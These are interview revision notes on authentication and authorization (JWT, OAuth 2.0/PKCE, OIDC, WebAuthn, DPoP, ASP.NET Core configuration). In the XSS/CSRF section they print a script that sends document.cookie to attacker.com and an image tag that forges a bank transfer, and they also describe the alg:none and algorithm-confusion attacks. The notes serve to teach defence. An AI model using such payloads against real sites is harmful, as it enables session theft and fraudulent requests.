# Authentication & Authorization — Interview Revision Notes

> Quick-revision Q&A derived from `D. Authentication-Authorization-Interview-Guide.md`. Covers every section of the source.

## 1. Core Concepts

### 1.1 Authentication vs Authorization

**Q: What is the difference between Authentication and Authorization?**

A: Authentication answers "who are you" (login process, populates `HttpContext.User` via `UseAuthentication()`). Authorization answers "what can you do" (claims/roles/policies evaluated via `UseAuthorization()` against `[Authorize]` requirements).

**Q: Why does an API return 401 instead of the expected 403?**

A: 401 means authentication never populated a valid principal (missing/invalid/expired token) — the pipeline never reached the authorization check. 403 means authentication succeeded but the role/policy check failed.

### 1.2 Stateful Sessions vs Stateless Tokens

**Q: Contrast stateful sessions with stateless tokens.**

A:
- Stateful sessions: server stores `sessionId -> userId, roles, expiry` (memory/Redis/DB); client holds only a random `sessionId` cookie. Pros: easy revocation, server controls truth. Cons: must store/scale session state.
- Stateless tokens (JWT is the common format): server issues a self-contained token; client sends it every request; server verifies cryptographically, no session store. Pros: horizontally scalable. Cons: harder revocation, needs careful design.

**Q: Is JWT a synonym for "stateless"?**

A: No — JWT is just one common token *format* used inside the stateless approach, not the approach itself.

```mermaid
flowchart LR
    subgraph Stateful["Stateful Session"]
    A1[Client] -- sessionId cookie --> A2[Server]
    A2 -- lookup --> A3[(Session Store\nRedis/DB)]
    end
    subgraph Stateless["Stateless JWT"]
    B1[Client] -- JWT --> B2[Server]
    B2 -- verify signature\nno DB call --> B2
    end
```

### 1.3 Basic Authentication (Legacy)

**Q: How does Basic Authentication work and why is it risky?**

A: Client sends `Authorization: Basic base64(username:password)` on every request. Base64 is encoding, not encryption — credentials are trivially recoverable if intercepted. No expiry/revocation, and captured requests can be replayed indefinitely. Must always run over HTTPS; still used for legacy/internal system-to-system compatibility.

```
Authorization: Basic dXNlcjpwYXNzd29yZA==
```

**Q: Define a replay attack.**

A: An attacker captures a valid authenticated request/token and resends it later to gain access without knowing the credentials. Basic Auth (and any bearer scheme without freshness checks) is inherently susceptible unless mitigated by TLS + short-lived credentials + nonces.

### 1.4 What JWT Actually Is

**Q: What is a JWT, and how does it relate to JWS/JWE/JOSE?**

A: JWT is a compact, URL-safe JSON-claims string. Signed = JWS (JSON Web Signature); encrypted = JWE (JSON Web Encryption). Both belong to the JOSE family, alongside JWK (key format) and JWA (algorithm names like `HS256`/`RS256`). Most people say "JWT" but mean JWS.

**Q: Is a signed JWT confidential?**

A: No. Anyone holding it can Base64URL-decode and read the payload. A signature gives integrity (can't be altered undetected) and authenticity (verifiable issuer) — not confidentiality. For confidentiality use JWE, avoid sensitive data in the token, or use opaque tokens + introspection.

**Q: What encoding does a JWT use and why?**

A: Base64URL (`+`→`-`, `/`→`_`, padding often omitted) — avoids characters with special meaning in URLs so the token can travel in URLs/headers/cookies without escaping. Encoding is still not security.

### 1.5 JWT Anatomy — Header, Payload, Signature

**Q: What are the three parts of a signed JWT?**

A: `Header.Payload.Signature`, each Base64URL-encoded.
- Header: `alg` (signing algorithm), `typ` (usually `JWT`), `kid` (key ID for JWKS lookup).
- Payload: claims (`iss`, `aud`, `sub`, `exp`, `iat`, `nbf`, custom claims like `scope`/`role`).
- Signature: computed over `base64url(header) + "." + base64url(payload)` using the `alg`-named algorithm; verifies header+payload are exactly what the issuer signed.

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "kid": "key-2026-05"
}
```

```json
{
  "iss": "https://auth.mycompany.com",
  "aud": "my-api",
  "sub": "user_123",
  "exp": 1760000000,
  "iat": 1759996400,
  "nbf": 1759996400,
  "scope": "orders:read orders:write",
  "role": "admin"
}
```

```mermaid
flowchart TB
    H["Header (JSON)\nalg, typ, kid"] --> B64H["Base64URL"]
    P["Payload (JSON claims)\niss, aud, sub, exp..."] --> B64P["Base64URL"]
    B64H --> CONCAT["base64url(header) + '.' + base64url(payload)"]
    B64P --> CONCAT
    CONCAT --> SIGN["Sign with alg + key"]
    SIGN --> JWT["Header.Payload.Signature"]
```

### 1.6 Claims: Registered, Public, Private

**Q: What are the standard registered JWT claims?**

A: `iss` (issuer), `sub` (subject/user id), `aud` (audience), `exp` (expiry), `iat` (issued at), `nbf` (not-before), `jti` (unique token id, useful for revocation lists).

**Q: Difference between public and private claims?**

A: Public claims use globally unique/collision-resistant names (often URIs) so unrelated parties don't clash. Private claims are your own app-specific fields (e.g., `employeeId`, `tenantId`, `Department`).

## 2. Intermediate

### 2.1 Signing Algorithms: HS256 vs RS256 vs ES256

**Q: Compare HS256, RS256, and ES256.**

A:
- HS256 (HMAC-SHA256, symmetric): one secret signs and verifies; anyone who can verify can also forge. Good for a single controlled authority; risky with many verifiers (secret sprawl).
- RS256 (RSA, asymmetric): private key signs, public key verifies. Safer distribution (publish JWKS); good for microservices/third-party verification.
- ES256 (ECDSA, asymmetric): same split as RS256 but smaller keys/tokens, often faster verification; slightly more library/HSM friction.

**Q: Rule of thumb for choosing a signing algorithm?**

A: Use RS256/ES256 when more than one service verifies tokens. Use HS256 only when you control every verifier and can protect the shared secret.

### 2.2 Where JWTs Live in HTTP & Storage Trade-offs

**Q: Where do JWTs typically travel, and what are the browser storage trade-offs?**

A: Most common: `Authorization: Bearer <token>` header; alternative: HttpOnly Secure cookie.
- `localStorage`/`sessionStorage`: JS-readable → high XSS risk, no CSRF risk (not auto-sent).
- HttpOnly cookie: not JS-readable → low XSS risk, but CSRF risk (auto-attached) → needs CSRF protection.

No universally perfect answer — depends on threat model; SPA+API teams often prefer HttpOnly cookies + CSRF, or a BFF pattern that keeps tokens off the browser entirely.

### 2.3 Access Tokens vs Refresh Tokens

**Q: Contrast access tokens and refresh tokens.**

A: Access token: short-lived (5–30 min), sent on every API call, hard to revoke (stateless), usually JWT. Refresh token: long-lived (days/weeks), sent only to the auth endpoint, easy to revoke (server-side record), usually an **opaque** random string.

**Q: Why are refresh tokens usually opaque instead of JWT?**

A: You want easy server-side revocation and rotation tracking — an opaque token is just a DB/Redis lookup key you fully control, with no self-contained claims to go stale.

### 2.4 Full Login → API → Refresh Flow

**Q: Walk through the login → API call → refresh sequence.**

A:
1. Client `POST /login` with credentials.
2. Auth server validates, returns Access Token (JWT) + Refresh Token (opaque).
3. Client calls API with `Authorization: Bearer <access token>`; API validates signature/`iss`/`aud`/`exp`.
4. When access token expires, client `POST /refresh` with the refresh token.
5. Auth server validates and rotates it, returning a new access token + new refresh token (old one invalidated).

```mermaid
sequenceDiagram
    participant C as Client
    participant AS as Auth Server
    participant API as Resource API

    C->>AS: POST /login (credentials)
    AS->>AS: Validate credentials
    AS-->>C: Access Token (JWT) + Refresh Token (opaque)
    C->>API: GET /orders (Authorization: Bearer <access token>)
    API->>API: Validate signature, iss, aud, exp
    API-->>C: 200 OK (data)
    Note over C,API: ...time passes, access token expires...
    C->>AS: POST /refresh (refresh token)
    AS->>AS: Validate refresh token, rotate it
    AS-->>C: New Access Token + New Refresh Token (old one invalidated)
```

**Q: What does "rotation" mean in this flow?**

A: Every refresh generates a brand-new refresh token and invalidates the old one — helps detect theft (see 3.8).

### 2.5 JWT Validation — What Actually Happens Internally

**Q: What does a correct JWT verifier actually do, beyond "check signature and expiry"?**

A:
1. Parse header + payload without trusting any field yet.
2. Select the key safely — pick public key by `kid` from a trusted, pre-configured JWKS; never fetch keys from a URL the token itself points to (`jku`/`x5u` injection).
3. Verify the signature using the algorithm *you* configured server-side, never the token's own `alg` claim.
4. Validate `exp` (future, with small clock skew), `nbf` (≤ now), `iss` (expected), `aud` (includes your API).
5. Authorize: check scopes/roles/permissions against the requested resource.
6. Optional hardening: check `jti` against a revocation list, check `tenantId` matches context, check `typ`/`token_use` so a refresh token can't be replayed as an access token.

**Q: What's the key idea to state explicitly in an interview?**

A: The signature proves the issuer created the token; claims validation proves it's meant for you and still valid — both are required. Mentioning only the signature is an incomplete answer.

### 2.6 Claims vs Roles vs Policy-Based Authorization

**Q: Define Role, Claim, and Policy.**

A: Role = simple grouping (`Admin`, `User`). Claim = key-value pair (`Department=Finance`). Policy = a named, centrally-registered rule built from claims/roles/custom logic.

**Q: Why do claims/policies scale better than roles?**

A: Roles multiply combinatorially as requirements narrow (`RegionAdmin`, `FinanceRegionAdmin`...). Claims express attributes independently and combine in policies without exploding a role table. Policies centralize decision logic in `AddAuthorization()` — one source of truth, critical for auditability.

```csharp
[Authorize(Roles = "Admin")] // role-based
if (!User.HasClaim("Department", "IT")) return Forbid(); // claims-based, inline
builder.Services.AddAuthorization(o => o.AddPolicy("ITOnly", p => p.RequireClaim("Department", "IT")));
[Authorize(Policy = "ITOnly")] // policy-based
```

**Q: What's a pitfall of policy-based authorization?**

A: Overly complex nested policies are hard to unit test/debug (failed policy just returns 403 with little detail). Mitigate with custom `IAuthorizationHandler`s that log *why* a requirement failed; keep policies small and composable.

### 2.7 The 7 ASP.NET Core Authorization Styles

**Q: List and describe the 7 ASP.NET Core authorization styles.**

A:
1. Simple — `[Authorize]`, just requires an authenticated user.
2. Role-based — `[Authorize(Roles = "Admin,Manager")]`, checks `ClaimTypes.Role`.
3. Policy-based — named policies registered once, referenced via `[Authorize(Policy = "...")]`; recommended default beyond trivial checks.
4. Claims-based — `RequireClaim(...)` in a policy or manual `User.HasClaim(...)`.
5. Custom requirement-based — `IAuthorizationRequirement` + `AuthorizationHandler<T>` for logic that can't be declarative (e.g. clearance ≥ classification).
6. Endpoint-specific — Minimal APIs' `.RequireAuthorization("PolicyName")` chained on route registration; same policy engine, different syntax.
7. Resource-based — `IAuthorizationService.AuthorizeAsync(User, resource, policy)`; decision depends on the specific object (e.g., document ownership), not just claims — requires loading the resource first.

```csharp
public class DocumentAuthHandler : AuthorizationHandler<SameAuthorRequirement, Document>
{
    protected override Task HandleRequirementAsync(AuthorizationHandlerContext context,
        SameAuthorRequirement requirement, Document resource)
    {
        if (resource.OwnerId == context.User.FindFirstValue(ClaimTypes.NameIdentifier))
            context.Succeed(requirement);
        return Task.CompletedTask;
    }
}
```

## 3. Advanced

### 3.1 OAuth 2.0 — Roles, Flows, and Grant Types

**Q: What is OAuth 2.0, and what are its four roles?**

A: An authorization framework letting a user grant a third-party app access to their data without sharing credentials (not itself an authentication protocol — OIDC adds that). Roles: Resource Owner (the user), Client (the app), Authorization Server (authenticates + issues tokens), Resource Server (hosts protected resources).

**Q: Walk through the Authorization Code flow ("Login with Google").**

A: User clicks login → app redirects to Google's auth endpoint → user authenticates/consents → Google redirects back with an authorization code → app exchanges the code for tokens server-to-server (with client secret or PKCE verifier) → app uses the access token to call the API.

```
GET https://accounts.google.com/o/oauth2/auth
    ?client_id=YOUR_CLIENT_ID
    &redirect_uri=https://yourapp.com/callback
    &response_type=code
    &scope=email profile
```

```
POST https://oauth2.googleapis.com/token
Content-Type: application/x-www-form-urlencoded

client_id=YOUR_CLIENT_ID
&client_secret=YOUR_CLIENT_SECRET
&code=AUTHORIZATION_CODE
&grant_type=authorization_code
&redirect_uri=https://yourapp.com/callback
```

```json
{
  "access_token": "ya29.a0AR...",
  "expires_in": 3600,
  "token_type": "Bearer",
  "refresh_token": "1//0g..."
}
```

### 3.2 OAuth2 Grant Types: Which Are Deprecated/Unsafe

**Q: Which OAuth2 grant types are current standard vs deprecated?**

A: Current: Authorization Code (+PKCE) for user-present apps; Client Credentials for M2M; Refresh Token; Device Code for input-constrained devices. Deprecated: Implicit (token exposed in URL fragment, no code exchange, no refresh token — removed in OAuth 2.1) and Resource Owner Password Credentials/ROPC (app handles raw credentials, defeats OAuth's purpose, no MFA support — removed in OAuth 2.1).

**Q: If Implicit flow is dead, how do modern SPAs get tokens?**

A: Authorization Code + PKCE — PKCE removes the need for a client secret while keeping the secure code-exchange model.

### 3.3 PKCE — Why It's Now Mandatory Even for Confidential Clients

**Q: How does PKCE work?**

A:
1. Client generates random `code_verifier`, derives `code_challenge = BASE64URL(SHA256(code_verifier))`.
2. Auth request includes `code_challenge` + `code_challenge_method=S256`.
3. Auth server stores the challenge with the issued code.
4. Token exchange includes the original `code_verifier`.
5. Server recomputes the hash and compares — mismatch rejects the exchange.

This defeats authorization code interception attacks since the verifier never leaves the client.

```mermaid
sequenceDiagram
    participant App as SPA (public client)
    participant AS as Authorization Server
    participant API as Resource API

    App->>App: Generate code_verifier, derive code_challenge (S256)
    App->>AS: Authorization request + code_challenge
    AS->>App: Redirect with authorization code
    App->>AS: Token request: code + code_verifier
    AS->>AS: Recompute SHA256(code_verifier), compare to stored challenge
    AS-->>App: Access Token + ID Token (+ Refresh Token if offline_access)
    App->>API: Bearer <access_token>
    API-->>App: Protected data
```

**Q: Why use PKCE even for confidential clients now?**

A: Defense in depth — a confidential client's code can still be intercepted at the redirect step (browser history, referrer leakage, logs). It also simplifies guidance ("always use PKCE") and is cheap to add alongside client secret/certificate auth.

### 3.4 OAuth 2.0 vs OpenID Connect vs JWT

**Q: Cleanly separate JWT, OAuth 2.0, and OIDC.**

A: JWT = token format. OAuth 2.0 = authorization framework (delegated access). OIDC = identity layer on top of OAuth 2.0, adding a standardized ID Token (always JWT), `/userinfo` endpoint, and login semantics.

**Q: What are the three tokens typically issued in an OIDC flow?**

A: ID Token (tells the client who the user is; always JWT), Access Token (authorizes API calls; JWT or opaque), Refresh Token (gets new tokens without re-login; usually opaque).

**Q: What's the most common mistake with ID tokens?**

A: Using the ID token to call your API. ID tokens are for the client to establish identity locally, not for resource servers. APIs should validate access tokens, whose `aud` is scoped to that API.

### 3.5 SAML vs OIDC for SSO/Federation

**Q: Compare SAML 2.0 and OIDC.**

A: SAML: XML signed assertions, browser redirect/POST bindings, enterprise/legacy IdPs (ADFS), poor mobile/SPA fit, fragile Single Logout. OIDC: JWT/JSON, compact URL-safe tokens, modern web/mobile/API-first, PKCE-friendly, simpler RP-Initiated Logout, JWKS-based key rotation.

**Q: Would you introduce SAML for a new project?**

A: No, not by choice — only when integrating with an existing enterprise IdP/partner that mandates it. New projects default to OIDC; an identity broker (Azure AD, Okta, Auth0, Keycloak) can bridge SAML upstream to OIDC downstream.

### 3.6 Azure AD (Entra ID) + Angular MSAL Implementation

**Q: What flow does Angular + MSAL use against Azure AD, and how does it work end-to-end?**

A: Authorization Code Flow with PKCE. Register the SPA app in Entra ID (redirect URI, App/Tenant IDs), configure API permissions, optionally expose the backend API with a scope, install `@azure/msal-browser`/`@azure/msal-angular`, configure MSAL (clientId/tenantId/redirectUri, cache in `sessionStorage`), protect routes with `MsalGuard`, use `loginRedirect()`/`logoutRedirect()`, let the MSAL interceptor attach tokens automatically, and secure the .NET API with Microsoft.Identity.Web validating against Azure AD's OIDC metadata/JWKS.

```
Angular App → Azure AD Login Page
       | Authorization Code + PKCE
       v
Azure AD issues Access Token / ID Token
       |
       v
Angular calls .NET API with Bearer Token
```

**Q: What are common Azure AD/MSAL pitfalls and best practices?**

A: Pitfalls — wrong redirect URI, missing admin consent, over-broad scopes, CORS misconfig, using deprecated implicit flow, audience mismatch. Best practices — Authorization Code + PKCE, never manually store tokens (let MSAL manage cache), HTTPS only, least-privilege scopes, conditional access policies, monitor sign-in logs.

### 3.7 Okta PKCE + Refresh Token + .NET API Implementation

**Q: How does the Okta + Angular + .NET token flow work?**

A: Angular (`@okta/okta-angular`/`okta-auth-js`) generates `code_verifier`/`code_challenge`, redirects to Okta login, receives an authorization code, exchanges it for Access/ID/Refresh tokens, an interceptor attaches `Authorization: Bearer <token>`, and `autoRenew` refreshes silently before expiry. The .NET API just needs standard JWT bearer config pointed at Okta's `Authority`/`Audience` — the middleware fetches OIDC discovery metadata (incl. JWKS) automatically and rotates keys transparently.

```typescript
const oktaAuth = new OktaAuth({
  issuer: 'https://YOUR_OKTA_DOMAIN/oauth2/default',
  clientId: 'YOUR_CLIENT_ID',
  redirectUri: window.location.origin + '/login/callback',
  scopes: ['openid', 'profile', 'email']
});
```

```mermaid
flowchart TD
    A[User clicks login] --> B[Angular generates code_verifier]
    B --> C[Creates code_challenge]
    C --> D[Redirect to Okta login]
    D --> E[User authenticates]
    E --> F[Okta returns Authorization Code]
    F --> G["Angular sends code + code_verifier"]
    G --> H["Okta issues Access Token, ID Token, Refresh Token"]
    H --> I[Access token used for API calls]
    I --> J[Access token expires]
    J --> K[Refresh token silently generates new access token]
```

```csharp
builder.Services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme)
    .AddJwtBearer(o => { o.Authority = "https://dev-12345.okta.com/oauth2/default"; o.Audience = "api://default"; });
```

**Q: Why is the `offline_access` scope needed?**

A: Without it, the authorization server only issues access/ID tokens — no refresh token is returned at all.

### 3.8 Refresh Token Rotation & Reuse Detection

**Q: What is refresh token rotation, and why isn't it enough on its own?**

A: Every refresh issues a new refresh token and invalidates the old one, narrowing the window a stolen token is useful — but rotation alone doesn't *detect* theft.

**Q: How does reuse detection work?**

A: Mark each used refresh token "consumed" (not deleted). If a consumed token is presented again, that signals theft (a legitimate client only ever has the latest token). On detecting reuse, revoke the entire token family/session chain, forcing full re-authentication.

```mermaid
sequenceDiagram
    participant U as Legitimate User
    participant A as Attacker (stole RT1)
    participant S as Auth Server

    U->>S: Refresh with RT1
    S->>S: Mark RT1 consumed, issue RT2
    S-->>U: New Access Token + RT2
    A->>S: Refresh with RT1 (stolen, already consumed)
    S->>S: Detect reuse of consumed token
    S->>S: Revoke entire token family (RT1, RT2, ...)
    S-->>A: 401 Unauthorized
    Note over U,S: Legitimate user is also logged out —\ntrade-off: security over convenience
```

**Q: What's the trade-off of revoking the whole family?**

A: The legitimate user also gets logged out if their token was the one stolen — an intentional fail-safe; only revoking the reused token would leave the attacker's rotated descendant still valid.

### 3.9 Securing SPA-to-API Auth: BFF Pattern vs Token-in-Browser

**Q: What is the BFF (Backend-for-Frontend) pattern and how does it differ from token-in-browser?**

A: Token-in-browser: the SPA (even via HttpOnly cookie) ultimately has a token reachable from the browser's origin. BFF: the browser never sees an OAuth token at all — the SPA holds only a plain session cookie with its own backend (the BFF), which performs the OAuth/OIDC dance itself (as a confidential client) and attaches the access token server-side when calling downstream APIs.

```mermaid
flowchart LR
    Browser["Browser (SPA)"] -- "Session cookie only\n(HttpOnly, Secure, SameSite)" --> BFF["BFF (your backend)"]
    BFF -- "OAuth Authorization Code + PKCE\n(server-to-server)" --> AS["Authorization Server"]
    BFF -- "Access token attached server-side" --> API["Resource API"]
```

**Q: What's the trade-off of BFF vs token-in-browser?**

A: BFF eliminates the "where do I safely store a token in the browser" problem and is the OAuth BCP-recommended approach for browser apps, at the cost of an extra backend component. Token-in-browser is simpler and a natural fit for mobile/Postman but keeps the browser inside the token's trust boundary.

### 3.10 ASP.NET Core Identity Customization

**Q: What are the main ASP.NET Core Identity customization points?**

A:
- Custom `IdentityUser` subclass (`AppUser : IdentityUser<Guid>`) with extra properties + matching `IdentityDbContext`.
- Custom `IPasswordValidator<TUser>`/`IUserValidator<TUser>` for org policy.
- Custom `UserClaimsPrincipalFactory<TUser>` to inject extra claims at sign-in.
- Use Identity for user/credential management (`SignInManager`, `UserManager`) but issue your own JWTs for API auth rather than relying on Identity's cookie auth.
- `AddIdentityCore<TUser>()` (no cookie/UI scaffolding) vs `AddIdentity<TUser,TRole>()` for API-only backends.
- Custom `IUserStore<TUser>` when users live in an external system (legacy DB, Azure AD).

```csharp
// API-only Identity setup — no cookie/UI scaffolding
builder.Services.AddIdentityCore<AppUser>(options =>
    {
        options.Password.RequiredLength = 12;
        options.User.RequireUniqueEmail = true;
    })
    .AddRoles<AppRole>()
    .AddEntityFrameworkStores<AppDbContext>()
    .AddDefaultTokenProviders();

builder.Services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme)
    .AddJwtBearer(/* ... */);
```

**Q: Why not just use Identity's built-in cookie auth for your API?**

A: Cookie auth is browser/session-oriented and doesn't naturally serve non-browser clients (mobile, service-to-service) or scale statelessly. Identity remains right for user/credential/role management; JWT issuance/validation handles API authentication.

### 3.11 Multi-Tenant Authentication & Authorization

**Q: Where should tenant identity live?**

A: Either as a `tenantId` claim in the token (simplest, but tenant changes need token re-issue) or derived from the request (subdomain/header/route) cross-checked against the user's allowed tenants (more flexible, extra per-request lookup).

**Q: How do you handle per-tenant identity providers?**

A: Shared IdP with a tenant claim is common for B2C SaaS. Per-tenant IdP (each enterprise brings their own Azure AD/Okta) requires dynamic issuer validation — `ValidIssuers`/a custom `IssuerValidator` delegate that resolves the expected issuer per tenant.

**Q: What's the #1 real-world multi-tenant bug class?**

A: Cross-tenant data leakage — every data query must be tenant-scoped; don't rely on the JWT's `tenantId` claim alone, also enforce it at the data-access layer (e.g., EF Core global query filters) as defense in depth.

```csharp
options.TokenValidationParameters = new TokenValidationParameters {
    ValidateIssuer = true,
    IssuerValidator = (issuer, token, parameters) =>
        _tenantIssuerResolver.IsKnownIssuer(issuer) ? issuer
        : throw new SecurityTokenInvalidIssuerException("Unknown tenant issuer"),
    ValidateAudience = true,
};
```

### 3.12 WebAuthn / FIDO2 / Passkeys

**Q: What's the core cryptographic idea behind WebAuthn/passkeys?**

A: Asymmetric key pairs generated per device, per origin — no shared secret to steal. The private key never leaves the authenticator (secure enclave/TPM); only the public key + `credentialId` are stored server-side. Each key pair is bound to a single origin, so nothing is reusable across sites.

**Q: Why is WebAuthn phishing-resistant in a way passwords/OTP are not?**

A: Passwords/OTP are strings a user (or autofill) can be tricked into entering on a phishing clone. A WebAuthn credential is cryptographically bound to the origin by the browser/OS itself — the authenticator will only sign for the origin it was registered against, so a phishing site at a different origin cannot obtain a valid assertion. OTP-based MFA remains vulnerable to real-time adversary-in-the-middle phishing proxies; WebAuthn removes the human-trust step entirely.

**Q: Describe the registration and authentication ceremonies.**

A:
- Registration (attestation): server sends a random challenge + RP info; browser calls `navigator.credentials.create()`; authenticator generates a new key pair, signs the challenge, returns public key + `credentialId`; server stores the public key against the account.
- Authentication (assertion): server sends a new challenge; browser calls `navigator.credentials.get()`; authenticator prompts for a local gesture and signs the challenge with the stored private key; server verifies the signature against the stored public key.

```mermaid
sequenceDiagram
    participant U as User
    participant B as Browser/Authenticator
    participant S as Server (Relying Party)

    Note over U,S: Authentication ceremony (login with an existing passkey)
    B->>S: Request login challenge for user
    S->>S: Generate random challenge, store temporarily
    S-->>B: Challenge + allowed credentialId(s)
    B->>U: Prompt for local gesture (biometric/PIN/security key)
    U->>B: Approve (local only — never sent to server)
    B->>B: Sign challenge with device-bound private key
    B->>S: Signed assertion + credentialId
    S->>S: Look up stored public key for credentialId, verify signature against challenge
    S-->>B: Authenticated (issue session/JWT as usual)
```

**Q: How does WebAuthn fit into an ASP.NET Core app, and does it replace MFA?**

A: ASP.NET Core Identity has been adding native passkey support; the long-standing option is `Fido2NetLib` for server-side ceremonies. Architecturally, the server is the Relying Party, storing public keys instead of passwords, and issues a normal session/JWT once the ceremony succeeds. Passkeys are often considered inherently multi-factor (something you have + something you are/know), though whether it "counts" as MFA is a policy decision, not a technical guarantee.

### 3.13 DPoP (RFC 9449 — Demonstrating Proof of Possession)

**Q: What problem does DPoP solve?**

A: Bearer tokens (JWT or opaque) are usable by whoever holds them — a stolen token can be replayed from anywhere, and the server can't tell attacker from legitimate client. DPoP cryptographically binds a token to the specific client that requested it.

**Q: How does DPoP work mechanically?**

A:
1. Client generates its own public/private key pair, held locally (never sent to the server).
2. For every request, the client creates a short-lived DPoP proof JWT (method, URL, timestamp, `jti`) signed with its private key.
3. At token request time, the auth server hashes the client's public key and embeds it in the access token as `cnf.jkt`.
4. On every API call, the client sends the access token **and** a fresh DPoP proof (`Authorization: DPoP <token>` + `DPoP` header).
5. The resource server checks the proof's signature/method/URL/recency **and** that the proof's key hash matches the token's `cnf.jkt`. A stolen token alone is useless without the private key.

```csharp
// Conceptual shape of a DPoP proof JWT (client-side, signed with the client's private key)
// Header: { "typ": "dpop+jwt", "alg": "ES256", "jwk": { /* client's public key */ } }
// Payload:
// {
//   "jti": "unique-per-request-id",
//   "htm": "GET",
//   "htu": "https://api.example.com/orders",
//   "iat": 1730000000
// }
// The resource server verifies this proof's signature against the embedded jwk,
// then checks that SHA256(jwk) matches the "cnf": { "jkt": "<thumbprint>" } claim
// baked into the access token by the authorization server at issuance time.
```

**Q: DPoP vs mTLS — why is DPoP "lighter weight"?**

A: mTLS binds via a full X.509 cert exchanged during the TLS handshake (transport-layer proof, needs CA/cert lifecycle, suits service-to-service). DPoP achieves an application-layer equivalent using ordinary JWTs and client-generated keys — no CA or infra changes, making it practical for SPAs/mobile. Trade-off: DPoP doesn't authenticate the transport channel and needs a short-lived `jti` replay cache server-side.

**Q: If you already use short-lived access tokens, why bother with DPoP?**

A: Short expiry limits the exposure *window* but does nothing to stop replay *within* that window. DPoP is complementary defense-in-depth that makes a stolen token worthless without the client's private key.

## 4. Security & Performance

### 4.1 Why JWT Revocation Is Hard — and the Real Strategies

**Q: Why is JWT revocation hard, and what are the mitigation strategies?**

A: A self-contained JWT remains valid until `exp` regardless of logout/deactivation/theft. Strategies:
- Very short access token lifetime (5–15 min) — most common, revoke the refresh token and wait out the window.
- Revocation list/blacklist by `jti` — reintroduces state/lookup cost; use for high-value scenarios.
- Token versioning (`ver` claim vs DB `userTokenVersion`) — still needs a per-request state check.
- Opaque tokens + introspection — fully revocable but adds a network hop per request.

There's no free lunch — every option trades away some statelessness.

### 4.2 Opaque Tokens vs JWT for Revocation — the Real Trade-off

**Q: Frame the JWT-vs-opaque-token choice as an architectural decision.**

A: It's a latency-vs-revocability trade-off, not a technology preference. JWT: zero network calls, excellent scalability, hard/immediate revocation, payload readable unless JWE. Opaque + introspection: trivial revocation, one network call per validation (mitigate with short-TTL caching), nothing disclosed, no offline verification. High-security systems (banking, admin sessions) lean opaque; high-throughput systems lean JWT. Many real systems hybridize: JWT access tokens + opaque refresh tokens.

### 4.3 JWT Validation Pitfalls: Algorithm Confusion & alg:none

**Q: Explain the `alg: none` attack and its fix.**

A: The JWT spec allows `alg: none` (unsigned). If a verifier naively trusts the token's own `alg` header, an attacker strips the signature and sets `alg: none`, and the server accepts it. Fix: never let the token dictate its verification algorithm — pin expected algorithm(s) explicitly server-side (e.g. `ValidAlgorithms`) and reject everything else including `none`.

**Q: Explain the RS256→HS256 algorithm confusion attack.**

A: If a server verifies RS256 with a public key but its library also accepts HS256 via the same key-lookup path, an attacker crafts an `alg: HS256` token and uses the (public) RSA public key bytes as the HMAC secret — producing a signature the server wrongly accepts. Fix: fix the expected algorithm and family server-side independent of the token header; never share key material across symmetric/asymmetric verification paths.

```csharp
options.TokenValidationParameters = new TokenValidationParameters {
    ValidateIssuerSigningKey = true,
    IssuerSigningKey = signingKey,
    ValidAlgorithms = new[] { SecurityAlgorithms.RsaSha256 }, // pin explicitly
    ValidateIssuer = true, ValidateAudience = true, ValidateLifetime = true,
    ClockSkew = TimeSpan.FromMinutes(2)
};
```

**Q: How would you spot this in code review?**

A: Look for verification code that reads the algorithm from the token itself to decide how to verify, code paths using one key object for both HMAC and RSA verification, and any explicit disabling of algorithm validation "to make a library work."

### 4.4 CSRF, XSS, and Session Fixation — How They Interact With Auth

**Q: Define XSS and CSRF and how they interact with auth.**

A: XSS — attacker injects JS into a trusted site that executes in another user's browser (can steal `document.cookie` or tokens from `localStorage`). CSRF — a malicious site tricks a logged-in user's browser into sending an unwanted request; browsers auto-attach cookies, so the target server sees an apparently legitimate request. `localStorage`/`sessionStorage` are XSS-risky but not CSRF-risky; HttpOnly cookies are the opposite (need `SameSite`/CSRF tokens).

```html
<script>
  fetch("https://attacker.com/steal?cookie=" + document.cookie);
</script>
```

```html
<!-- On evil.com, while you're logged into bank.com -->
<img src="https://bank.com/transfer?to=attacker&amount=10000" />
```

**Q: What is session fixation, and how do you mitigate it?**

A: An attacker forces a known session identifier onto a victim before login (e.g., via a URL-embedded session ID); if the server doesn't issue a fresh identifier after successful auth, the attacker's pre-known ID becomes valid once the victim logs in. Mitigation: always regenerate the session ID/token on successful login, never accept session IDs from the URL, use server-generated cryptographically random HttpOnly identifiers.

**Q: Synthesize how XSS, CSRF, and session fixation differ.**

A: They target different layers — XSS attacks token/credential *storage*, CSRF attacks the *ambient trust* in cookies, session fixation attacks the *lifecycle* of session identifiers. Each needs its own mitigation (CSP/sanitization; SameSite + anti-forgery tokens; token regeneration on login) — HttpOnly cookies alone solve XSS-token-theft but reintroduce CSRF exposure.

### 4.5 mTLS for Service-to-Service Auth

**Q: What is mTLS and why use it for service-to-service auth?**

A: In normal TLS only the server presents a certificate; in mTLS the client also presents one, so both sides authenticate each other during the handshake itself, before any app-layer token. Useful in zero-trust internal networks (service mesh like Istio/Linkerd) to verify every hop cryptographically.

**Q: What are mTLS's trade-offs vs bearer tokens, and how does it combine with OAuth?**

A: Certificates need issuance/rotation infra (often handled transparently by a mesh sidecar) — heavier than rotating a client secret. mTLS authenticates the *service*, not fine-grained scopes — you typically still layer OAuth client credentials on top for authorization. Common pattern: mTLS for transport-level identity + OAuth client credentials for authorization claims (defense in depth). In .NET, Kestrel supports client cert validation, but most production setups delegate this to a mesh/gateway.

### 4.6 API Keys vs OAuth Client Credentials for Machine-to-Machine

**Q: When would you use an API key vs OAuth Client Credentials for M2M access?**

A: API keys prove "caller possesses this static secret" — no built-in expiry, typically all-or-nothing scope, manual revocation, no standard protocol; fine for simple/low-risk integrations. OAuth Client Credentials proves a registered client authenticated and got a scoped, short-lived token — built-in expiry, native per-client scoping, standardized (RFC 6749), more moving parts. Senior framing: API keys are *identification*, not real *authorization* — use OAuth Client Credentials for anything security-sensitive.

### 4.7 Performance Considerations

**Q: What are the key performance trade-offs around JWT-based auth?**

A:
- JWT avoids a DB/session lookup per request (core win), but RS256/ES256 verification is more CPU-intensive than HS256, and every revocation mitigation (blacklist, versioning, introspection) reintroduces some I/O.
- Large token payloads add network overhead on every request — keep claims minimal.
- JWKS responses should be cached (respecting `Cache-Control`) rather than fetched per request; `Authority`-based config usually does this automatically.
